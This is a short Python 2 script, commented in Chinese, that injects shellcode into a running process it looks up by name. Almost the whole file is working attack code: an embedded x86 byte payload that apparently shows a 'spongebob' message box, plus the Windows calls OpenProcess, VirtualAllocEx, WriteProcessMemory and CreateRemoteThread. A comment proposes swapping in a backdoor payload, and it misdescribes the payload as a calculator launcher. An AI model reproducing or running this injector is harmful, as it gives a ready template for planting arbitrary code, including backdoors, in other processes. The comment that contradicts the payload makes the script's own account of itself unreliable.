# -*- coding:utf-8 -*-
#

import psutil
import re
import sys

def processinfo(process_name):
  pid_list=psutil.pids()
  for each_pid in pid_list:
    try:
      each_pro=psutil.Process(each_pid)
      if each_pro.name().lower()==process_name.lower():
        print each_pid;
        return each_pid
    except psutil.NoSuchProcess,pid:
      print "no such"



buf=""
buf+="\x56\xb9\x38\x68\x0d\x16\xe8\x31\x00\x00\x00\x8b\xf0\x85\xf6\x74"
buf+="\x29\x57\x33\xff\x57\x57\x57\xe8\xf8\x00\x00\x00\x05\x2d\x11\x40"
buf+="\x00\x50\x57\x57\xff\xd6\xb9\xc6\x96\x87\x52\x8b\xf0\xe8\x0a\x00"
buf+="\x00\x00\x5f\x85\xc0\x74\x03\x56\xff\xd0\x5e\xc3\x83\xec\x10\x64"
buf+="\xa1\x30\x00\x00\x00\x53\x55\x56\x8b\x40\x0c\x57\x89\x4c\x24\x18"
buf+="\x8b\x70\x0c\xe9\x8a\x00\x00\x00\x8b\x46\x30\x33\xc9\x8b\x5e\x2c"
buf+="\x8b\x36\x89\x44\x24\x14\x8b\x42\x3c\x8b\x6c\x10\x78\x89\x6c\x24"
buf+="\x10\x85\xed\x74\x6d\xc1\xeb\x10\x33\xff\x85\xdb\x74\x1f\x8b\x6c"
buf+="\x24\x14\x8a\x04\x2f\xc1\xc9\x0d\x3c\x61\x0f\xbe\xc0\x7c\x03\x83"
buf+="\xc1\xe0\x03\xc8\x47\x3b\xfb\x72\xe9\x8b\x6c\x24\x10\x8b\x44\x2a"
buf+="\x20\x33\xdb\x8b\x7c\x2a\x18\x03\xc2\x89\x7c\x24\x14\x85\xff\x74"
buf+="\x31\x8b\x28\x33\xff\x03\xea\x83\xc0\x04\x89\x44\x24\x1c\x0f\xbe"
buf+="\x45\x00\xc1\xcf\x0d\x03\xf8\x45\x80\x7d\xff\x00\x75\xf0\x8d\x04"
buf+="\x0f\x3b\x44\x24\x18\x74\x20\x8b\x44\x24\x1c\x43\x3b\x5c\x24\x14"
buf+="\x72\xcf\x8b\x56\x18\x85\xd2\x0f\x85\x6b\xff\xff\xff\x33\xc0\x5f"
buf+="\x5e\x5d\x5b\x83\xc4\x10\xc3\x8b\x74\x24\x10\x8b\x44\x16\x24\x8d"
buf+="\x04\x58\x0f\xb7\x0c\x10\x8b\x44\x16\x1c\x8d\x04\x88\x8b\x04\x10"
buf+="\x03\xc2\xeb\xdb\x55\x8b\xec\x51\xe8\x00\x00\x00\x00\x58\x2d\x1d"
buf+="\x11\x40\x00\x89\x45\xfc\x8b\x45\xfc\x8b\xe5\x5d\xc3\x55\x8b\xec"
buf+="\x83\xec\x34\x53\x33\xdb\xc7\x45\xcc\x57\x65\x20\x61\xb9\x4c\x77"
buf+="\x26\x07\xc7\x45\xd0\x72\x65\x20\x73\xc7\x45\xd4\x70\x6f\x6e\x67"
buf+="\xc7\x45\xd8\x65\x62\x6f\x62\xc7\x45\xdc\x21\x20\x59\x6f\xc7\x45"
buf+="\xe0\x75\x20\x61\x72\xc7\x45\xe4\x65\x20\x73\x6f\xc7\x45\xe8\x20"
buf+="\x63\x6c\x65\xc7\x45\xec\x76\x65\x72\x21\x89\x5d\xf0\xc7\x45\xf4"
buf+="\x75\x73\x65\x72\xc7\x45\xf8\x33\x32\x2e\x64\x66\xc7\x45\xfc\x6c"
buf+="\x6c\x88\x5d\xfe\xe8\xa3\xfe\xff\xff\x85\xc0\x75\x05\x83\xc8\xff"
buf+="\xeb\x1f\x8d\x4d\xf4\x51\xff\xd0\xb9\x45\x83\x56\x07\xe8\x8a\xfe"
buf+="\xff\xff\x85\xc0\x74\xe7\x53\x8d\x4d\xcc\x51\x51\x53\xff\xd0\x33"
buf+="\xc0\x5b\x8b\xe5\x5d\xc2\x04\x00"


# 导入sys库以及ctypes库
import sys
from ctypes import *

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
VIRTUAL_MEM = (0x1000 | 0x2000)

kernel32 = windll.kernel32
# pid = int(sys.argv[1])

# if not sys.argv[1]:
# 	print "Code Injector: ./code_injector.py <PID to inject>"
# 	sys.exit(0)
#pid = 7976
pid = processinfo("python.exe")
# shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程# 序。生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
shellcode = buf
code_size = len(shellcode)
print(code_size)

# 获取我们要注入的进程句柄
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
print(h_process)
if not h_process:
	print "[*] Couldn't acquire a handle to PID: %s" % pid
	sys.exit(0)


# 为我们的shellcode申请内存
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# 在内存中写入shellcode
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

# 创建远程线程，指定入口为我们的shellcode头部
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
	print "[*] Failed to inject shellcode. Exiting."
sys.exit(0)

print ("[*] Remote thread successfully created with a thread ID of: 0x%08x" % thread_id.value)